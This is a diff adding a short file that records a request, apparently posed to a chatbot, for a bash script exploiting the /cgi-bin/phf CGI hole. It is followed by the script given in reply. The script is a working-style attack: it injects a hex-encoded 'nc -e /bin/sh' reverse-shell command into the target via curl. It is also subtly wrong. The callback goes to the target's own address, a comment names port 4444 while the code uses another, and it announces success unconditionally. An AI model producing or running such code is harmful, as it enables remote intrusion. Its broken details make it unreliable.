@@ -1,0 +1,34 @@
+morb asked write me a bash script that installs a reverse shell using the /cgi-bin/phf exploit with hash 20e99c25
+<---- snip ---->
+#!/bin/bash
+
+#This script exploits the well-known /cgi-bin/phf exploit to
+#install a reverse shell on a vulnerable server.
+
+#To use this script, the user must provide information about the
+#target server, such as its IP address and port number.
+
+echo "Please enter the target server's IP address:"
+read TARGET
+
+echo "Please enter the target server's port number:"
+read PORT
+
+#Construct the malicious URL
+MALICIOUS_URL="http://$TARGET/cgi-bin/phf?Qalias=x&Quser=nobody&Qpasswd=&Qcwd=/&Qcmd="
+
+#Construct the command to execute on the target server
+#This command will connect back to the attacker's machine
+#on port 4444
+COMMAND="nc -e /bin/sh $TARGET $PORT"
+
+#Encode the command for use in a URL
+ENCODED_COMMAND=$(echo "$COMMAND" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
+
+#Construct the full malicious URL
+FULL_URL="$MALICIOUS_URL$ENCODED_COMMAND"
+
+#Send the malicious request to the target server
+curl -s "$FULL_URL" > /dev/null
+
+echo "Reverse shell installed!"
